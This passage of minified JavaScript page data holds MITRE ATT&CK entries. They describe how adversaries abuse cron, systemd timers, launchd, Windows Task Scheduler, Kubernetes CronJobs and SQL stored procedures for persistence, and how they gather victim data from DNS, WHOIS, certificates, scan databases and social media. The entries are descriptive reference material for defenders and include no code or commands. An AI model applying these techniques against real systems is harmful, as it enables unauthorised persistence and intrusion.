href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0110'\u003Eat\u003C\u002Fa\u003E requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. \n\nAn adversary may use \u003Ccode\u003Eat.exe\u003C\u002Fcode\u003E in Windows environments to execute programs at system startup or on a scheduled basis for persistence. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0110'\u003Eat\u003C\u002Fa\u003E can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).\n\nNote: The \u003Ccode\u003Eat.exe\u003C\u002Fcode\u003E command line utility has been deprecated in current versions of Windows in favor of \u003Ccode\u003Eschtasks\u003C\u002Fcode\u003E.";Cd.external_references=[{source_name:b,external_id:Ce,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1053\u002F002"},{url:Cf,description:Cg,source_name:Ch},{url:Ci,description:Cj,source_name:Ck},{url:Cl,description:Cm,source_name:Cn},{source_name:Co,url:Cp,description:Cq},{url:y,description:z,source_name:A}];Cd["subtechnique-of"]=W;Cr.id=Cs;Cr["object-type"]=a;Cr.name="Container Orchestration Job";Cr.description="Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fkubernetes.io\u002Fdocs\u002Fconcepts\u002Fworkloads\u002Fcontrollers\u002Fjob\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fkubernetes.io\u002Fdocs\u002Fconcepts\u002Fworkloads\u002Fcontrollers\u002Fcron-jobs\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in the cluster.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.microsoft.com\u002Fsecurity\u002Fblog\u002F2020\u002F04\u002F02\u002Fattack-matrix-kubernetes\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E";Cr.external_references=[{source_name:b,external_id:Cs,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1053\u002F007"},{source_name:"Kubernetes Jobs",url:"https:\u002F\u002Fkubernetes.io\u002Fdocs\u002Fconcepts\u002Fworkloads\u002Fcontrollers\u002Fjob\u002F",description:"The Kubernetes Authors. (n.d.). Kubernetes Jobs. Retrieved March 30, 2021."},{source_name:"Kubernetes CronJob",url:"https:\u002F\u002Fkubernetes.io\u002Fdocs\u002Fconcepts\u002Fworkloads\u002Fcontrollers\u002Fcron-jobs\u002F",description:"The Kubernetes Authors. (n.d.). Kubernetes CronJob. Retrieved March 29, 2021."},{source_name:Ct,url:Cu,description:Cv}];Cr["subtechnique-of"]=W;Cw.id=Cx;Cw["object-type"]=a;Cw.name="Cron";Cw.description="Adversaries may abuse the \u003Ccode\u003Ecron\u003C\u002Fcode\u003E utility to perform task scheduling for initial or recurring execution of malicious code. The \u003Ccode\u003Ecron\u003C\u002Fcode\u003E utility is a time-based job scheduler for Unix-like operating systems.  The \u003Ccode\u003E crontab\u003C\u002Fcode\u003E file contains the schedule of cron entries to be run and the specified times for execution. Any \u003Ccode\u003Ecrontab\u003C\u002Fcode\u003E files are stored in operating system-specific file paths.\n\nAn adversary may use \u003Ccode\u003Ecron\u003C\u002Fcode\u003E in Linux or Unix environments to execute programs at system startup or on a scheduled basis for persistence. \u003Ccode\u003Ecron\u003C\u002Fcode\u003E can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account.";Cw.external_references=[{source_name:b,external_id:Cx,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1053\u002F003"}];Cw["subtechnique-of"]=W;Cy.id=Cz;Cy["object-type"]=a;Cy.name="Launchd";Cy.description="Adversaries may abuse the \u003Ccode\u003ELaunchd\u003C\u002Fcode\u003E daemon to perform task scheduling for initial or recurring execution of malicious code. The \u003Ccode\u003Elaunchd\u003C\u002Fcode\u003E daemon, native to macOS, is responsible for loading and maintaining services within the operating system. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in \u003Ccode\u003E\u002FSystem\u002FLibrary\u002FLaunchDaemons\u003C\u002Fcode\u003E and \u003Ccode\u003E\u002FLibrary\u002FLaunchDaemons\u003C\u002Fcode\u003E \u003Csup\u003E\u003Ca href='https:\u002F\u002Fdeveloper.apple.com\u002Flibrary\u002Fcontent\u002Fdocumentation\u002FMacOSX\u002FConceptual\u002FBPSystemStartup\u002FChapters\u002FCreatingLaunchdJobs.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E. These LaunchDaemons have property list files which point to the executables that will be launched \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.virusbulletin.com\u002Fuploads\u002Fpdf\u002Fconference\u002Fvb2014\u002FVB2014-Wardle.pdf'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E.\n\nAn adversary may use the \u003Ccode\u003Elaunchd\u003C\u002Fcode\u003E daemon in macOS environments to schedule new executables to run at system startup or on a scheduled basis for persistence. \u003Ccode\u003Elaunchd\u003C\u002Fcode\u003E can also be abused to run a process under the context of a specified account. Daemons, such as \u003Ccode\u003Elaunchd\u003C\u002Fcode\u003E, run with the permissions of the root user account, and will operate regardless of which user account is logged in.";Cy.external_references=[{source_name:b,external_id:Cz,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1053\u002F004"},{url:cq,description:cr,source_name:cs},{url:B,description:S,source_name:T}];Cy["subtechnique-of"]=W;CA.id=CB;CA["object-type"]=a;CA.name="Scheduled Task";CA.description="Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The \u003Ccode\u003Eschtasks\u003C\u002Fcode\u003E can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0110'\u003Eat\u003C\u002Fa\u003E utility could also be abused by adversaries (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1053\u002F002'\u003EAt (Windows)\u003C\u002Fa\u003E), though \u003Ccode\u003Eat.exe\u003C\u002Fcode\u003E can not access tasks created with \u003Ccode\u003Eschtasks\u003C\u002Fcode\u003E or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).";CA.external_references=[{source_name:b,external_id:CB,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1053\u002F005"},{url:Cf,description:Cg,source_name:Ch},{url:Ci,description:Cj,source_name:Ck},{url:Cl,description:Cm,source_name:Cn},{source_name:Co,url:Cp,description:Cq},{url:y,description:z,source_name:A}];CA["subtechnique-of"]=W;CC.id=CD;CC["object-type"]=a;CC.name="Systemd Timers";CC.description="Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension \u003Ccode\u003E.timer\u003C\u002Fcode\u003E that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1053\u002F003'\u003ECron\u003C\u002Fa\u003E in Linux environments.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwiki.archlinux.org\u002Findex.php\u002FSystemd\u002FTimers'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nEach \u003Ccode\u003E.timer\u003C\u002Fcode\u003E file must have a corresponding \u003Ccode\u003E.service\u003C\u002Fcode\u003E file with the same name, e.g., \u003Ccode\u003Eexample.timer\u003C\u002Fcode\u003E and \u003Ccode\u003Eexample.service\u003C\u002Fcode\u003E. \u003Ccode\u003E.service\u003C\u002Fcode\u003E files are \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1543\u002F002'\u003ESystemd Service\u003C\u002Fa\u003E unit files that are managed by the systemd system and service manager.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fman7.org\u002Flinux\u002Fman-pages\u002Fman1\u002Fsystemd.1.html'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Privileged timers are written to \u003Ccode\u003E\u002Fetc\u002Fsystemd\u002Fsystem\u002F\u003C\u002Fcode\u003E and \u003Ccode\u003E\u002Fusr\u002Flib\u002Fsystemd\u002Fsystem\u003C\u002Fcode\u003E while user level are written to \u003Ccode\u003E~\u002F.config\u002Fsystemd\u002Fuser\u002F\u003C\u002Fcode\u003E.\n\nAn adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.bleepingcomputer.com\u002Fnews\u002Fsecurity\u002Fmalware-found-in-arch-linux-aur-package-repository\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fgist.github.com\u002Fcampuscodi\u002F74d0d2e35d8fd9499c76333ce027345a'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Flists.archlinux.org\u002Fpipermail\u002Faur-general\u002F2018-July\u002F034153.html'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence.";CC.external_references=[{source_name:b,external_id:CD,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1053\u002F006"},{source_name:"archlinux Systemd Timers Aug 2020",url:"https:\u002F\u002Fwiki.archlinux.org\u002Findex.php\u002FSystemd\u002FTimers",description:"archlinux. (2020, August 11). systemd\u002FTimers. Retrieved October 12, 2020."},{source_name:nK,url:nL,description:nM},{description:"Catalin Cimpanu. (2018, July 10). Malware Found in Arch Linux AUR Package Repository. Retrieved April 23, 2019.",url:"https:\u002F\u002Fwww.bleepingcomputer.com\u002Fnews\u002Fsecurity\u002Fmalware-found-in-arch-linux-aur-package-repository\u002F",source_name:"Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018"},{description:"Catalin Cimpanu. (2018, July 10). ~x file downloaded in public Arch package compromise. Retrieved April 23, 2019.",url:"https:\u002F\u002Fgist.github.com\u002Fcampuscodi\u002F74d0d2e35d8fd9499c76333ce027345a",source_name:"gist Arch package compromise 10JUL2018"},{description:"Eli Schwartz. (2018, June 8). acroread package compromised. Retrieved April 23, 2019.",url:"https:\u002F\u002Flists.archlinux.org\u002Fpipermail\u002Faur-general\u002F2018-July\u002F034153.html",source_name:"acroread package compromised Arch Linux Mail 8JUL2018"}];CC["subtechnique-of"]=W;CN.id=CO;CN["object-type"]=a;CN.name="Purchase Technical Data";CN.description="Adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.\n\nAdversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim’s infrastructure.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.zdnet.com\u002Farticle\u002Fa-hacker-group-is-selling-more-than-73-million-user-records-on-the-dark-web\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Information from these sources may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1587'\u003EDevelop Capabilities\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588'\u003EObtain Capabilities\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1133'\u003EExternal Remote Services\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E).";CN.external_references=[{source_name:b,external_id:CO,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1597\u002F002"},{source_name:CK,url:CL,description:CM}];CN["subtechnique-of"]=dt;CP.id=CQ;CP["object-type"]=a;CP.name="Threat Intel Vendors";CP.description="Adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs\u002Fcountermeasures.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fd3security.com\u002Fblog\u002F10-of-the-best-open-source-threat-intelligence-feeds\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information\u002Findicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities\u002Fobjectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1587'\u003EDevelop Capabilities\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588'\u003EObtain Capabilities\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1190'\u003EExploit Public-Facing Application\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1133'\u003EExternal Remote Services\u003C\u002Fa\u003E).";CP.external_references=[{source_name:b,external_id:CQ,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1597\u002F001"},{source_name:CH,url:CI,description:CJ}];CP["subtechnique-of"]=dt;Db.id=Dc;Db["object-type"]=a;Db.name="CDNs";Db.description="Adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor’s geographical region.\n\nAdversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and\u002For do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization’s website.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.digitalshadows.com\u002Fblog-and-research\u002Fcontent-delivery-networks-cdns-can-leave-you-exposed-how-you-might-be-affected-and-what-you-can-do-about-it\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Information from these sources may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1595'\u003EActive Scanning\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583'\u003EAcquire Infrastructure\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1584'\u003ECompromise Infrastructure\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1189'\u003EDrive-by Compromise\u003C\u002Fa\u003E).";Db.external_references=[{source_name:b,external_id:Dc,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596\u002F004"},{source_name:CX,url:CY,description:CZ}];Db["subtechnique-of"]=aE;Dd.id=De;Dd["object-type"]=a;Dd.name="DNS\u002FPassive DNS";Dd.description="Adversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts.\n\nAdversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdnsdumpster.com\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.circl.lu\u002Fservices\u002Fpassive-dns\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries may also seek and target DNS misconfigurations\u002Fleaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1594'\u003ESearch Victim-Owned Websites\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583'\u003EAcquire Infrastructure\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1584'\u003ECompromise Infrastructure\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1133'\u003EExternal Remote Services\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1199'\u003ETrusted Relationship\u003C\u002Fa\u003E).";Dd.external_references=[{source_name:b,external_id:De,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596\u002F001"},{source_name:az,url:aA,description:aB},{source_name:aT,url:aU,description:aV}];Dd["subtechnique-of"]=aE;Df.id=Dg;Df["object-type"]=a;Df.name=fi;Df.description="Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL\u002FTLS communications), contain information about the registered organization such as name and location.\n\nAdversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.sslshopper.com\u002Fssl-checker.html'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmedium.com\u002F@menakajain\u002Fexport-download-ssl-certificate-from-server-site-url-bcfc41ea46a2'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Information from these sources may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1595'\u003EActive Scanning\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1587'\u003EDevelop Capabilities\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588'\u003EObtain Capabilities\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1133'\u003EExternal Remote Services\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1199'\u003ETrusted Relationship\u003C\u002Fa\u003E).";Df.external_references=[{source_name:b,external_id:Dg,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596\u002F003"},{source_name:CU,url:CV,description:CW},{source_name:CR,url:CS,description:CT}];Df["subtechnique-of"]=aE;Dh.id=Di;Dh["object-type"]=a;Dh.name="Scan Databases";Dh.description="Adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans\u002Fsurveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fshodan.io'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1595'\u003EActive Scanning\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593'\u003ESearch Open Websites\u002FDomains\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1587'\u003EDevelop Capabilities\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1588'\u003EObtain Capabilities\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1133'\u003EExternal Remote Services\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1190'\u003EExploit Public-Facing Application\u003C\u002Fa\u003E).";Dh.external_references=[{source_name:b,external_id:Di,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596\u002F005"},{source_name:C_,url:C$,description:Da}];Dh["subtechnique-of"]=aE;Dj.id=Dk;Dj["object-type"]=a;Dj.name=aS;Dj.description="Adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.whois.net\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1595'\u003EActive Scanning\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1583'\u003EAcquire Infrastructure\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1584'\u003ECompromise Infrastructure\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1133'\u003EExternal Remote Services\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1199'\u003ETrusted Relationship\u003C\u002Fa\u003E).";Dj.external_references=[{source_name:b,external_id:Dk,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596\u002F002"},{source_name:aS,url:bF,description:bG}];Dj["subtechnique-of"]=aE;Du.id=Dv;Du["object-type"]=a;Du.name="Search Engines";Du.description="Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsecuritytrails.com\u002Fblog\u002Fgoogle-hacking-techniques'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.exploit-db.com\u002Fgoogle-hacking-database'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages\u002Fleaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596'\u003ESearch Open Technical Databases\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1585'\u003EEstablish Accounts\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1586'\u003ECompromise Accounts\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566'\u003EPhishing\u003C\u002Fa\u003E).";Du.external_references=[{source_name:b,external_id:Dv,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593\u002F002"},{source_name:Do,url:Dp,description:Dq},{source_name:Dr,url:Ds,description:Dt}];Du["subtechnique-of"]=du;Dw.id=Dx;Dw["object-type"]=a;Dw.name="Social Media";Dw.description="Adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.\n\nAdversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles\u002Fgroups to elicit victim’s into revealing specific information (i.e. \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598\u002F001'\u003ESpearphishing Service\u003C\u002Fa\u003E).\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcyware.com\u002Fnews\u002Fhow-hackers-exploit-social-media-to-break-into-your-company-88e8da8e'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Information from these sources may reveal opportunities for other forms of reconnaissance (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1598'\u003EPhishing for Information\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1596'\u003ESearch Open Technical Databases\u003C\u002Fa\u003E), establishing operational resources (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1585'\u003EEstablish Accounts\u003C\u002Fa\u003E or \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1586'\u003ECompromise Accounts\u003C\u002Fa\u003E), and\u002For initial access (ex: \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1566\u002F003'\u003ESpearphishing via Service\u003C\u002Fa\u003E).";Dw.external_references=[{source_name:b,external_id:Dx,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1593\u002F001"},{source_name:Dl,url:Dm,description:Dn}];Dw["subtechnique-of"]=du;DB.id=DC;DB["object-type"]=a;DB.name="SQL Stored Procedures";DB.description="Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started\u002Frestarted).\n\nAdversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.netspi.com\u002Fsql-server-persistence-part-1-startup-stored-procedures\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsecurelist.com\u002Fmalicious-tasks-in-ms-sql-server\u002F92167\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.netspi.com\u002Fsql-server-persistence-part-1-startup-stored-procedures\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsecurelist.com\u002Fmalicious-tasks-in-ms-sql-server\u002F92167\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca 